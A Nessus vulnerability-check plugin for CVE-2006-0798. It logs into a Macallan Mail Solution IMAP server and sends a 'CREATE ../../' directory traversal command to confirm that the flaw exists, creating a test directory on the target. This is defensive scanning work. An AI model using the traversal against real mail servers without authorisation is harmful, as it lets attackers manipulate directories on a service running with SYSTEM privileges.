#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote IMAP server is affected by directory traversal
vulnerabilities. 

Description :

The remote host is running Macallan Mail Solution, a mail server for
Windows. 

The IMAP server bundled with the version of Macallan installed on the
remote host fails to filter directory traversal sequences from mailbox
names passed to the 'CREATE', 'DELETE, 'RENAME', and 'SELECT'
commands.  An authenticated attacker can exploit these issues to gain
access to sensitive information and more generally to manipulate
arbitrary directories on the affected host. 

Note that the software's IMAP server is part of the MCPop3 service,
which runs with LOCAL SYSTEM privileges. 

See also : 

http://secunia.com/secunia_research/2006-4/advisory/

Solution :

Upgrade to Macallan Mail Solution version 4.8.05.004 or later. 

Risk factor :

Low / CVSS Base Score : 2.7
(AV:R/AC:L/Au:R/C:P/I:P/A:N/B:N)";


if (description) {
  script_id(20936);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-0798");
  script_bugtraq_id(16704);
  script_xref(name:"OSVDB", value:"23269");

  script_name(english:"Macallan IMAP Server Directory Traversal Vulnerabilities");
  script_summary(english:"Checks for a directory traversal vulnerability in Macallan");

  script_description(english:desc);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencie("find_service.nes", "imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner and make sure it looks like Macallan's.
s = recv_line(socket:soc, length:1024);
if (
  !strlen(s) || 
  "* OK Greeting" >!< s
) {
  close(soc);
  exit(0);
}


# Try to log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}


# If successful, try to exploit the flaw.
#
# nb: SELECT seems to return OK regardless of whether the directory
#     actually exists in a vulnerable version. 
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  # Create a mailbox in the main directory for Macallan Mail Solutions.
  #
  # nb: Macallan happily creates any necessary parent directories.
  mailbox = string("NESSUS/", SCRIPT_NAME, "/", unixtime());
  c = string("nessus", string(tag), " CREATE ../../", mailbox);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # There's a problem if we were successful; ie,
  # "nessus2 OK CREATE completed" vs "nessus2 NO - '..' is Not Allowed".
  if (resp && resp =~ "OK" && "CREATE completed" >< s) {
    if (report_verbosity > 0) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able to create the following directory on the remote\n",
        "host, under the directory in which Macallan is installed:\n",
        "\n",
        "  ", mailbox
      );
    }
    else report = desc;

    security_note(port:port, data:report);
  }
}
else if (resp =~ "BAD" || resp =~ "NO") {
  if (log_verbosity > 1) debug_print("couldn't login with supplied imap credentials!", level:0);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
